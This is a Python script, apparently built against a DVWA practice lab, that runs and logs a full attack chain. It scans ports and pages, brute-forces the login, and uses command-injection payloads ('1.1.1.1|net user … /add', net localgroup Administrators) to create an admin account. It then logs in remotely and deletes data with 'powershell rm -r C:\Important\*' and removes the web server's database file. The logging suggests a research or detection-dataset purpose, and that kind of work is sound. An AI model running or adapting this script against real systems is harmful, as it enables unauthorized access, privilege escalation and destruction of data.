from stages.recon import Recon
from stages.access import Access
from stages.execution import Execution
from stages.persistence import Persistence
from stages.exfiltration import Exfiltration
from services.AttackLogger import AttackLogger
from config import *
from time import sleep

with AttackLogger(output_dir="attack_logs") as log:

    recon = Recon(TARGET_IP)

    recon.scan_ports()
    log.log(
        "port_scan", "recon",
        action="tcp_port_scan",
        details={"target": TARGET_IP},
        success=True,
    )

    pages = recon.scan_pages("wordlists/web.txt")
    print(pages)
    log.log(
        "web_recon", "recon",
        action="directory_wordlist_scan",
        details={
            "target": TARGET_IP,
            "wordlist": "wordlists/web.txt",
            "pages_found": pages if isinstance(pages, list) else str(pages)[:200],
        },
        success=bool(pages),
    )
    sleep(3)

    access = Access(
        username_wordlist=USERNAME_WORDLIST,
        password_wordlist=PASSWORD_WORDLIST,
        url=DVWA_LOGIN_URL,
    )

    (username, password) = access.brute_force_login()
    creds_found = bool(username and password)
    log.log(
        "brute_force", "access",
        action="http_brute_force_login",
        details={
            "url":               DVWA_LOGIN_URL,
            "username_wordlist": USERNAME_WORDLIST,
            "password_wordlist": PASSWORD_WORDLIST,
            "found_username":    username if creds_found else None,
        },
        result=f"{username}:{password}" if creds_found else "no credentials found",
        success=creds_found,
    )

    if creds_found:
        print(f"Valid credentials found: {username}:{password}")
    else:
        print("No valid credentials found.")

    username = "admin"
    password = "password"
    response = access.login(username, password, DVWA_LOGIN_URL)
    login_ok = response is not False
    log.log(
        "brute_force", "access",
        action="session_login",
        details={"url": DVWA_LOGIN_URL, "username": username},
        success=login_ok,
    )
    if not login_ok:
        print("Login failed with valid credentials.")

    sleep(3)
    execution = Execution(session=access.session)
    response = execution.execute_command_post(
        command=f"1.1.1.1|net user {NEW_USER} {NEW_USER_PASSWORD} /add ",
        url=DVWA_COMMAND_INJECTION
    )
    log.log(
        "exploit", "command_injection_create_user",
        action="session_login",
        details={"url": DVWA_COMMAND_INJECTION, "result": response},
        success=login_ok,
    )

    response = execution.execute_command_post(
        command=f"1.1.1.1|net localgroup Administrators {NEW_USER} /add",
        url=DVWA_COMMAND_INJECTION
    )
    log.log(
        "exploit", "command_injection_to_administrator",
        action="session_login",
        details={"url": DVWA_COMMAND_INJECTION, "result": response},
        success=login_ok,
    )

    exfiltration = Exfiltration(TARGET_IP, NEW_USER, NEW_USER_PASSWORD)

    exfiltration.connect()

    exfiltration.execute_command("cd C:/Important")
    result = exfiltration.execute_command("powershell rm -r C:\\Important\\*")
    log.log("action_on_objectives", "delete_important_folder",
            action="delete",
            success=result)
  

    result = exfiltration.execute_command("powershell rm C:\\xampp\\htdocs\\database\\sqli.db")
    log.log("action_on_objectives", "delete the webserver database",
            action="delete",
            success=result)

    sleep(3)